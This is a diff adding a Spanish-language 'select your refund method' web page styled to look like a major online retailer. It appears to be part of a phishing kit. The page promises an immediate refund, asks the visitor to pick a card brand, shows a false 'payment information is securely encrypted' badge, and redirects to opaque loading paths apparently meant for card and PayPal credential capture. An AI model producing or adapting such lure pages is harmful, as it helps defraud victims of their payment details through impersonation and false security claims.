@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selecciona tu método de pago</title>
+    <link rel="stylesheet" href="/css/bratoka.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .header h1 {
+            color: #0F1111;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            color: #565959;
+            font-size: 16px;
+        }
+        
+        .payment-methods {
+            margin-bottom: 30px;
+        }
+        
+        .payment-option {
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .payment-option:hover {
+            border-color: #007185;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .payment-option.selected {
+            border-color: #007185;
+            background-color: #f0f8ff;
+        }
+        
+        .payment-option input[type="radio"] {
+            position: absolute;
+            opacity: 0;
+        }
+        
+        .payment-option label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            width: 100%;
+        }
+        
+        .card-select-container {
+            margin-left: 0;
+            padding-left: 0;
+        }
+        
+        .card-select {
+            background-color: white;
+            color: #0F1111;
+        }
+        
+        .card-select:focus {
+            outline: none;
+            border-color: #007185;
+            box-shadow: 0 0 0 2px rgba(0, 113, 133, 0.2);
+        }
+        
+        .card-logo {
+            width: 60px;
+            height: 40px;
+            margin-right: 15px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        .visa-logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAzNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC41IiB5PSIwLjUiIHdpZHRoPSIzMyIgaGVpZ2h0PSIyMyIgcng9IjMuNSIgZmlsbD0id2hpdGUiIHN0cm9rZT0iI0UyRTJFMiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTEwLjc1MDMgMTUuODU4M0g4LjY5MDU2TDcuMTQ2IDkuNzkyNDdDNy4wNzI2OSA5LjUxMzQ0IDYuOTE3MDMgOS4yNjY3NiA2LjY4ODA2IDkuMTUwNUM2LjExNjY0IDguODU4MzMgNS40ODY5NiA4LjYyNTggNC44MDAwNSA4LjUwODUzVjguMjc0OTlIOC4xMTgxM0M4LjU3NjA3IDguMjc0OTkgOC45MTk1MyA4LjYyNTggOC45NzY3NyA5LjAzMzIzTDkuNzc4MTcgMTMuNDA4N0wxMS44MzY5IDguMjc0OTlIMTMuODM5NEwxMC43NTAzIDE1Ljg1ODNaTTE0Ljk4NDMgMTUuODU4M0gxMy4wMzlMMTQuNjQwOCA4LjI3NDk5SDE2LjU4NjFMMTQuOTg0MyAxNS44NTgzWk0xOS4xMDI4IDEwLjM3NThDMTkuMTYgOS45NjczOCAxOS41MDM1IDkuNzMzODQgMTkuOTA0MiA5LjczMzg0QzIwLjUzMzggOS42NzUyIDIxLjIxOTcgOS43OTI0OCAyMS43OTIyIDEwLjA4MzZMMjIuMTM1NiA4LjQ1MDkxQzIxLjU2MzIgOC4yMTczNyAyMC45MzM1IDguMTAwMSAyMC4zNjIxIDguMTAwMUMxOC40NzQxIDguMTAwMSAxNy4xMDAzIDkuMTUwNSAxNy4xMDAzIDEwLjYwODNDMTcuMTAwMyAxMS43MTc0IDE4LjA3MzQgMTIuMjk5NyAxOC43NjAzIDEyLjY1MDVDMTkuNTAzNSAxMy4wMDAzIDE5Ljc4OTcgMTMuMjMzOCAxOS43MzI0IDEzLjU4MzZDMTkuNzMyNCAxNC4xMDgzIDE5LjE2IDE0LjM0MTkgMTguNTg4NiAxNC4zNDE5QzE3LjkwMTcgMTQuMzQxOSAxNy4yMTQ3IDE0LjE2NyAxNi41ODYxIDEzLjg3NDhMMTYuMjQyNiAxNS41MDg2QzE2LjkyOTUgMTUuNzk5NyAxNy42NzI3IDE1LjkxNyAxOC4zNTk2IDE1LjkxN0MyMC40NzY2IDE1Ljk3NDYgMjEuNzkyMiAxNC45MjUyIDIxLjc5MjIgMTMuMzUwMUMyMS43OTIyIDExLjM2NjYgMTkuMTAyOCAxMS4yNTAzIDE5LjEwMjggMTAuMzc1OFpNMjguNiAxNS44NTgzTDI3LjA1NTUgOC4yNzQ5OUgyNS4zOTY1QzI1LjA1MyA4LjI3NDk5IDI0LjcwOTUgOC41MDg1MyAyNC41OTUxIDguODU4MzNMMjEuNzM0OSAxNS44NTgzSDIzLjczNzRMMjQuMTM3MSAxNC43NTAzSDI2LjU5NzZMMjYuODI2NSAxNS44NTgzSDI4LjZaTTI1LjY4MjcgMTAuMzE3MkwyNi4yNTQxIDEzLjE3NTJIMjQuNjUyM0wyNS42ODI3IDEwLjMxNzJaIiBmaWxsPSIjMTcyQjg1Ii8+Cjwvc3ZnPgo=');
+        }
+        
+        .mastercard-logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAzNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC41IiB5PSIwLjUiIHdpZHRoPSIzMyIgaGVpZ2h0PSIyMyIgcng9IjMuNSIgZmlsbD0id2hpdGUiIHN0cm9rZT0iI0NFQ0VDRSIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE3LjE3OSAxNi44MjkyQzE1Ljk5NDkgMTcuODI3MyAxNC40NTkgMTguNDI5OCAxMi43ODA3IDE4LjQyOThDOS4wMzU4MiAxOC40Mjk4IDYgMTUuNDMwMSA2IDExLjcyOThDNiA4LjAyOTQ4IDkuMDM1ODIgNS4wMjk3OSAxMi43ODA3IDUuMDI5NzlDMTQuNDU5IDUuMDI5NzkgMTUuOTk0OSA1LjYzMjI4IDE3LjE3OSA2LjYzMDMzQzE4LjM2MyA1LjYzMjI4IDE5Ljg5ODkgNS4wMjk3OSAyMS41NzczIDUuMDI5NzlDMjUuMzIyMSA1LjAyOTc5IDI4LjM1OCA4LjAyOTQ4IDI4LjM1OCAxMS43Mjk4QzI4LjM1OCAxNS40MzAxIDI1LjMyMjEgMTguNDI5OCAyMS41NzczIDE4LjQyOThDMTkuODk4OSAxOC40Mjk4IDE4LjM2MyAxNy44MjczIDE3LjE3OSAxNi44MjkyWiIgZmlsbD0iI0VEMDAwNiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE3LjE3OSAxNi44MjkyQzE4LjYzNjkgMTUuNjAwMyAxOS41NjE0IDEzLjc3MTcgMTkuNTYxNCAxMS43Mjk4QzE5LjU2MTQgOS42ODc4MyAxOC42MzY5IDcuODU5MjMgMTcuMTc5IDYuNjMwMzJDMTguMzYzIDUuNjMyMjggMTkuODk4OSA1LjAyOTc5IDIxLjU3NzIgNS4wMjk3OUMyNS4zMjIxIDUuMDI5NzkgMjguMzU3OSA4LjAyOTQ4IDI4LjM1NzkgMTEuNzI5OEMyOC4zNTc5IDE1LjQzMDEgMjUuMzIyMSAxOC40Mjk4IDIxLjU3NzIgMTguNDI5OEMxOS44OTg5IDE4LjQyOTggMTguMzYzIDE3LjgyNzMgMTcuMTc5IDE2LjgyOTJaIiBmaWxsPSIjRjlBMDAwIi8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTcuMTc5IDE2LjgyOTJDMTguNjM2OSAxNS42MDAzIDE5LjU2MTQgMTMuNzcxNyAxOS41NjE0IDExLjcyOThDMTkuNTYxNCA5LjY4Nzg3IDE4LjYzNjkgNy44NTkyNyAxNy4xNzkgNi42MzAzN0MxNS43MjExIDcuODU5MjcgMTQuNzk2NiA5LjY4Nzg3IDE0Ljc5NjYgMTEuNzI5OEMxNC43OTY2IDEzLjc3MTcgMTUuNzIxMSAxNS42MDAzIDE3LjE3OSAxNi44MjkyWiIgZmlsbD0iI0ZGNUUwMCIvPgo8L3N2Zz4K');
+        }
+        
+        .amex-logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA2MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjYwIiBoZWlnaHQ9IjQwIiByeD0iNCIgZmlsbD0iIzAwNjZCQyIvPgo8dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0iI0ZGRkZGRiI+QU1FWDwvdGV4dD4KPC9zdmc+Cg==');
+        }
+        
+        .discover-logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA2MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjYwIiBoZWlnaHQ9IjQwIiByeD0iNCIgZmlsbD0iI0ZGNjMwMCIvPgo8dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEwIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0iI0ZGRkZGRiI+RElTQ09WRVI8L3RleHQ+Cjwvc3ZnPgo=');
+        }
+        
+        .paypal-logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAzNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMC41IiB5PSIwLjUiIHdpZHRoPSIzMyIgaGVpZ2h0PSIyMyIgcng9IjMuNSIgZmlsbD0id2hpdGUiIHN0cm9rZT0iI0UyRTJFMiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE0LjYxNCAxOC40NDgzTDE0LjgzNDcgMTYuOTk5MkwxNC4zNDMxIDE2Ljk4NzNIMTEuOTk1MUwxMy42MjY4IDYuMjkzN0MxMy42MzE5IDYuMjYxMzIgMTMuNjQ4NCA2LjIzMTI2IDEzLjY3MjQgNi4yMDk4N0MxMy42OTY1IDYuMTg4NDkgMTMuNzI3MiA2LjE3Njc2IDEzLjc1OTQgNi4xNzY3NkgxNy43MTg0QzE5LjAzMjggNi4xNzY3NiAxOS45Mzk4IDYuNDU5MzkgMjAuNDEzMyA3LjAxNzM0QzIwLjYzNTMgNy4yNzkwOCAyMC43NzY3IDcuNTUyNjcgMjAuODQ1MiA3Ljg1MzY0QzIwLjkxNjkgOC4xNjk1MSAyMC45MTgxIDguNTQ2ODUgMjAuODQ4MSA5LjAwNzE1TDIwLjg0MyA5LjA0MDYzVjkuMzM1NjFMMjEuMDY1MSA5LjQ2NTYzQzIxLjI1MiA5LjU2ODE1IDIxLjQwMDYgOS42ODU0NiAyMS41MTQ1IDkuODE5NzVDMjEuNzA0NCAxMC4wNDM2IDIxLjgyNzIgMTAuMzI4MSAyMS44NzkxIDEwLjY2NTJDMjEuOTMyOCAxMS4wMTIgMjEuOTE1MSAxMS40MjQ4IDIxLjgyNzIgMTEuODkyQzIxLjcyNTkgMTIuNDI5NSAyMS41NjIyIDEyLjg5NzYgMjEuMzQxIDEzLjI4MDVDMjEuMTM3NiAxMy42MzM0IDIwLjg3ODUgMTMuOTI2MiAyMC41NzA4IDE0LjE1M0MyMC4yNzcgMTQuMzY4NiAxOS45MjggMTQuNTMyMiAxOS41MzMzIDE0LjYzNjlDMTkuMTUwOSAxNC43Mzk4IDE4LjcxNDkgMTQuNzkxNyAxOC4yMzY3IDE0Ljc5MTdIMTcuOTI4NkMxNy43MDgzIDE0Ljc5MTcgMTcuNDk0MyAxNC44NzM3IDE3LjMyNjMgMTUuMDIwN0MxNy4xNTc5IDE1LjE3MDggMTcuMDQ2NSAxNS4zNzU4IDE3LjAxMjMgMTUuNkwxNi45ODkgMTUuNzMwNUwxNi41OTkgMTguMjg0OEwxNi41ODE0IDE4LjM3ODVDMTYuNTc2NyAxOC40MDgyIDE2LjU2ODYgMTguNDIzIDE2LjU1NjggMTguNDMzQzE2LjU0NjMgMTguNDQyMiAxNi41MzExIDE4LjQ0ODMgMTYuNTE2NCAxOC40NDgzSDE0LjYxNFoiIGZpbGw9IiMyODM1NkEiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yMS4yNzU2IDkuMDc0NzFDMjEuMjYzOSA5LjE1Mjc5IDIxLjI1MDMgOS4yMzI1OCAyMS4yMzUyIDkuMzE0NThDMjAuNzEzMSAxMi4wODUyIDE4LjkyNjggMTMuMDQyNCAxNi42NDU2IDEzLjA0MjRIMTUuNDg0QzE1LjIwNSAxMy4wNDI0IDE0Ljk2OTggMTMuMjUxNyAxNC45MjY1IDEzLjUzNjJMMTQuMTYzMyAxOC41Mzk0QzE0LjEzNTEgMTguNzI2MyAxNC4yNzQzIDE4Ljg5NDUgMTQuNDU2NiAxOC44OTQ1SDE2LjUxNjhDMTYuNzYwNyAxOC44OTQ1IDE2Ljk2OCAxOC43MTEzIDE3LjAwNjQgMTguNDYyN0wxNy4wMjY2IDE4LjM1NDVMMTcuNDE0NSAxNS44MTAzTDE3LjQzOTQgMTUuNjcwOEMxNy40Nzc0IDE1LjQyMTMgMTcuNjg1MSAxNS4yMzggMTcuOTI5IDE1LjIzOEgxOC4yMzcxQzIwLjIzMzEgMTUuMjM4IDIxLjc5NTcgMTQuNDAwNCAyMi4yNTI0IDExLjk3NjZDMjIuNDQzMSAxMC45NjQxIDIyLjM0NDMgMTAuMTE4NiAyMS44Mzk1IDkuNTI0MDJDMjEuNjg2OCA5LjM0NDc2IDIxLjQ5NzMgOS4xOTU5MiAyMS4yNzU2IDkuMDc0NzFaIiBmaWxsPSIjMjk4RkMyIi8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMjAuNzI5MSA4Ljg0OTQ0QzIwLjY0OTMgOC44MjUzNyAyMC41NjcgOC44MDM2MiAyMC40ODI2IDguNzgzOTRDMjAuMzk3NyA4Ljc2NDc2IDIwLjMxMDggOC43NDc3NyAyMC4yMjEzIDguNzMyODdDMTkuOTA4MSA4LjY4MDU3IDE5LjU2NDkgOC42NTU3NiAxOS4xOTc0IDguNjU1NzZIMTYuMDk0M0MxNi4wMTc4IDguNjU1NzYgMTUuOTQ1MiA4LjY3MzYgMTUuODgwMyA4LjcwNTg2QzE1LjczNzIgOC43NzY5OCAxNS42MzA5IDguOTE3MDEgMTUuNjA1MSA5LjA4ODQ1TDE0Ljk0NDkgMTMuNDFMMTQuOTI2IDEzLjUzNkMxNC45Njk0IDEzLjI1MTUgMTUuMjA0NiAxMy4wNDIyIDE1LjQ4MzYgMTMuMDQyMkgxNi42NDUxQzE4LjkyNjQgMTMuMDQyMiAyMC43MTI2IDEyLjA4NDUgMjEuMjM0NyA5LjMxNDM5QzIxLjI1MDMgOS4yMzI0IDIxLjI2MzQgOS4xNTI2MSAyMS4yNzUxIDkuMDc0NTJDMjEuMTQzMSA5LjAwMjA2IDIxIDguOTQwMTEgMjAuODQ2IDguODg3MzJDMjAuODA3OSA4Ljg3NDI1IDIwLjc2ODcgOC44NjE2NiAyMC43MjkxIDguODQ5NDRaIiBmaWxsPSIjMjIyODRGIi8+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTUuNjA1NCA5LjA4ODYyQzE1LjYzMTIgOC45MTcxOCAxNS43Mzc0IDguNzc3MTUgMTUuODgwNiA4LjcwNjUyQzE1Ljk0NiA4LjY3NDE0IDE2LjAxODEgOC42NTYzIDE2LjA5NDYgOC42NTYzSDE5LjE5NzZDMTkuNTY1MiA4LjY1NjMgMTkuOTA4NCA4LjY4MTIzIDIwLjIyMTYgOC43MzM1M0MyMC4zMTExIDguNzQ4MzEgMjAuMzk4IDguNzY1NDIgMjAuNDgyOSA4Ljc4NDZDMjAuNTY3MyA4LjgwNDE1IDIwLjY0OTUgOC44MjYwMyAyMC43Mjk0IDguODQ5OThDMjAuNzY5IDguODYyMiAyMC44MDgyIDguODc0OSAyMC44NDY2IDguODg3NDlDMjEuMDAwNyA4Ljk0MDI4IDIxLjE0MzggOS4wMDI3MiAyMS4yNzU5IDkuMDc0NjlDMjEuNDMxMiA4LjA1MDgyIDIxLjI3NDYgNy4zNTM3IDIwLjczOSA2LjcyMjQ1QzIwLjE0ODUgNi4wMjc0IDE5LjA4MjggNS43Mjk5OCAxNy43MTkxIDUuNzI5OThIMTMuNzZDMTMuNDgxNSA1LjcyOTk4IDEzLjI0MzkgNS45MzkzIDEzLjIwMDggNi4yMjQyNkwxMS41NTE4IDE3LjAyNzlDMTEuNTE5MyAxNy4yNDE2IDExLjY3ODggMTcuNDM0NCAxMS44ODczIDE3LjQzNDRIMTQuMzMxNUwxNS42MDU0IDkuMDg4NjJaIiBmaWxsPSIjMjgzNTZBIi8+Cjwvc3ZnPgo=');
+        }
+        
+        .card-info {
+            flex: 1;
+            margin-left: 15px;
+        }
+        
+        .card-name {
+            font-weight: bold;
+            color: #0F1111;
+            margin-bottom: 5px;
+        }
+        
+        .card-description {
+            color: #565959;
+            font-size: 14px;
+        }
+        
+        .continue-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #FFD814;
+            border: 1px solid #FCD200;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .continue-button:hover:not(:disabled) {
+            background-color: #F7CA00;
+        }
+        
+        .continue-button:disabled {
+            background-color: #F0F2F2;
+            border-color: #D5D9D9;
+            color: #B5BCC0;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        .continue-button:not(:disabled) {
+            background: #FFD814;
+            border-color: #FFD814;
+            box-shadow: 0 2px 8px rgba(255, 153, 0, 0.3);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .continue-button:not(:disabled):hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(255, 153, 0, 0.4);
+        }
+        
+        .secure-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            color: #565959;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Elija su método de reembolso preferido</h1>
+<p>Seleccione el método que prefiera para recibir su reembolso de inmediato</p>
+        </div>
+        
+        <form id="paymentForm">
+            <div class="payment-methods">
+                <div class="payment-option" data-method="card">
+                    <label>
+                        <input type="radio" name="paymentMethod" value="card" id="cardRadio">
+                        <div class="card-info">
+                            <div class="card-name">Tarjeta de débito o crédito</div>
+                            <div class="card-description">Seleccione su tarjeta</div>
+                            <div class="card-icons" style="display: flex; gap: 8px; margin-top: 8px;">
+                                <div class="small-card-logo mastercard-logo" style="width: 40px; height: 25px; background-size: contain; background-repeat: no-repeat; background-position: center;"></div>
+                                <div class="small-card-logo visa-logo" style="width: 40px; height: 25px; background-size: contain; background-repeat: no-repeat; background-position: center;"></div>
+                                <div class="small-card-logo amex-logo" style="width: 40px; height: 25px; background-size: contain; background-repeat: no-repeat; background-position: center;"></div>
+                                <!-- <div class="small-card-logo discover-logo" style="width: 40px; height: 25px; background-size: contain; background-repeat: no-repeat; background-position: center;"></div> -->
+                             </div> 
+                        </div>
+                    </label>
+                    <div class="card-select-container" style="margin-top: 15px; display: none;" id="cardSelectContainer">
+                        <select class="card-select" id="cardType" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
+                            <option value="">Seleccione su tarjeta</option>
+                            <option value="mastercard">Mastercard</option>
+                            <option value="visa">Visa</option>
+                            <option value="amex">American Express</option>
+                            <!-- <option value="discover">Discover</option> -->
+                        </select>
+                    </div>
+                </div>
+                
+                
+            </div>
+            
+            <button type="submit" id="continue-btn" class="continue-button" disabled>
+                <span>Procesar reembolso</span>
+                <!-- <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M9 18l6-6-6-6"/>
+                </svg> -->
+            </button>
+        </form>
+        
+        <div class="secure-info">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg><p>La información de pago está cifrada de forma segura</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const paymentOptions = document.querySelectorAll('.payment-option');
+            const continueButton = document.querySelector('.continue-button');
+            const form = document.getElementById('paymentForm');
+            const cardRadio = document.getElementById('cardRadio');
+            const paypalRadio = document.getElementById('paypalRadio');
+            const cardSelectContainer = document.getElementById('cardSelectContainer');
+            const cardType = document.getElementById('cardType');
+
+            // Handle payment option selection
+            paymentOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const radio = this.querySelector('input[type="radio"]');
+                    radio.checked = true;
+                    
+                    paymentOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    
+                    // Show/hide card type dropdown
+                    if (radio.value === 'card') {
+                        cardSelectContainer.style.display = 'block';
+                        continueButton.disabled = cardType.value === '';
+                    } else {
+                        cardSelectContainer.style.display = 'none';
+                        continueButton.disabled = false;
+                    }
+                });
+            });
+
+            // Handle card type selection
+            cardType.addEventListener('change', function() {
+                if (cardRadio.checked) {
+                    continueButton.disabled = this.value === '';
+                }
+            });
+
+            // Handle form submission
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const selectedMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
+                
+                if (selectedMethod === 'paypal') {
+                    window.location = "/loadingpp?time=3&url=/HlX3xzdM2SwoPR72Fg5JL";
+                } else {
+                    // For card payments, redirect to card processing
+                    window.location = "/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
